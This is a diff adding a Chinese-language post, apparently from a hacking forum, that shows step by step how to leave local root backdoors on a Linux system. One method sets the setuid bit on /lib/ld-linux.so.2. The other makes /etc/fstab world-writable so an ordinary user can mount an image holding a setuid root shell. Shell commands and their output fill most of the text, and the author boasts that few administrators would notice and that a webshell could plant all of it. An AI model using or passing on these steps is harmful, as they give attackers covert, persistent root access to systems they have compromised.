@@ -1,0 +1,50 @@
+方法一：setuid的方法，其实8是很隐蔽。看看过程:
+
+[root@localdomain lib]# ls -l |grep ld-linux
+lrwxrwxrwx 1 root root 9 2008-06-07 17:32 ld-linux.so.2 -> ld-2.7.so
+lrwxrwxrwx 1 root root 13 2008-06-07 17:47 ld-lsb.so.3 -> ld-linux.so.2
+[root@localdomain lib]# chmod +s ld-linux.so.2
+[root@localdomain lib]# ls -l |grep ld-2.7.so
+-rwsr-sr-x 1 root root 128952 2007-10-18 04:49 ld-2.7.so
+lrwxrwxrwx 1 root root 9 2008-06-07 17:32 ld-linux.so.2 -> ld-2.7.so
+[root@localdomain lib]#
+我们这里给/lib/ld-linux.so.2这个文件（在FC8里，它指向ld-2.7.so这个文件）加了setuid属性。然后我们看怎么利用它。
+
+普通用户登录，测试下权限：
+
+[xiaoyu@localdomain ~]$ whoami
+xiaoyu
+[xiaoyu@localdomain ~]$ /lib/ld-linux.so.2 `which whoami`
+root
+[xiaoyu@localdomain ~]$
+恩，嘿嘿 root了吧，具体怎么生成root shell，你们自己去想吧，凡事都不要点得太透，对吧。呵呵，可以肯定的一点，/lib/ld-linux.so.2 /bin/sh肯定生成不了rootshell， bash检查euid 和uid，看是否相等...OK，不多说了。
+
+方法二：
+
+看过程:
+
+[root@localdomain etc]# chmod a+w /etc/fstab
+[root@localdomain etc]#
+
+这就留好了。此方法比较XXOXX，估计没几个管理员知道。利用方法演示下
+
+[xiaoyu@localdomain ~]$ ls -l /etc/fstab
+-rw-rw-rw- 1 root root 456 2008-06-07 17:28 /etc/fstab
+[xiaoyu@localdomain ~]$ echo 'test /mnt ext2 user,suid,exec,loop 0 0' >> /etc/fstab
+
+然后从本机把一个文件到目标机器上去，这里我们命名为test
+
+[xiaoyu@localdomain tmp]$ ls -l test
+-rw-rw-r-- 1 xiaoyu xiaoyu 102400 2008-04-20 02:51 test
+[xiaoyu@localdomain tmp]$ mount test
+[xiaoyu@localdomain tmp]$ cd /mnt
+[xiaoyu@localdomain mnt]$ ls -l
+total 18
+drwx------ 2 root root 12288 2008-04-20 05:44 lost+found
+-rwsr-sr-x 1 root root 4927 2008-04-20 05:44 root
+[xiaoyu@localdomain mnt]$ ./root
+sh-3.2#
+看到了吧，从普通用户提升到root了。呵呵。
+test这个文件baidu貌似木有上传功能撒，木办法传
+
+貌似可能有人说本地后门木啥鸟用，但是你要搞清楚：一个webshell里面就可以完成这一切....
